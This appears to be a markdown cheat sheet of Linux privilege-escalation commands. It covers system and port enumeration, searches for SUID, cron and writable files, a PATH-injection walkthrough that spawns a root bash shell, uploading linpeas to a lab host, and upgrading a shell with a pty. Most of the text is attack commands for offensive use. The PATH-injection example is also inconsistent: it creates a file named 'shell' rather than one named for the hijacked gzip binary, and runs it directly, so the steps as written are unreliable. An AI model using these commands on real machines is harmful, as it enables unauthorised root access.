# Linux-Exploitation

## Get Distro
```bash
lsb_release -a
cat /proc/version
cat /etc/issue
cat /etc/os-release
cat /etc/*release 
cat /etc/issue* 
cat /proc/version
```

## Get Ports Open
```bash
netstat -antup
cat /etc/hosts
sudo lsof -i -P -n | grep LISTEN
sudo netstat -tulpn | grep LISTEN
sudo ss -tulpn | grep LISTEN
sudo lsof -i:22 ## see a specific port such as 22 ##
```

## Show the services which are running as root
```bash
ps -aux | grep root
```
## find software that the user can run and look for exploits pertaining to that software version
```bash
echo $0
	bash
bash --version
	4.4.20
sudo --version
	1.8.21p2
 ```
 ### Example
 google search: sudo 1.8.21p2 exploit vulnerabilty
 ```bash
 searchsploit bash
 ```
 

## Look for SUID files allows user to run them as root
```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```
## What can the user run as root?
```bash
sudo -l ## be careful this may trigger an action to be logged if your user is not meant to run sudo
```

## See what is being run by cron
Are there any scripts that run as root or another user that we can edit?
```
ls -la /etc/cron.d
ls -la /etc/cron.daily 
ls -la /etc/cron.weekly
ls -la /etc/cron.monthly
```
## Show writable files
```bash
find / -perm -2 -type f 2>/dev/null
```
## Show enviorment variables
```bash 
env
```
## find specific word
```bash
find /path/to/search -type f -exec grep -l "your-search-string" {} \;
find / -type f -exec grep -l "flag" {} \;
```

## PATH INJECTION
### find files with SUID allows user to run them as root
```bash
find / -perm -u=s -type f 2>/dev/null
```
result
```
bad.sh
```
### find file that call on binarys from path
```bash
cat bad.sh
```
The result calls on a path variable for gzip. so if we make our own path for gzip that points to a script that spawns a bash shell. That bash shell will be run as root.
```bash
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
```
lets go to tmp folder so all of our work will be deleted when machine shuts down
```bash
cd /tmp
```
lets make a shell file
```bash
echo "/bin/bash" > shell
chmod 777 shell
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell
whoami
```

#upload linpeas 
scp -i james_rsa /media/sf_SharedFolder/Tools/Enumeration/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh james@10.10.203.26:/tmp
chmod +x linpeas.sh
./linpeas.sh | tee linlog.txt

gain bash shell
#google upgrading shells reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
#on your shell do
	Ctrl + Z
	echo $TERM
	stty -a
	stty raw -echo
	fg #type and press ENTER




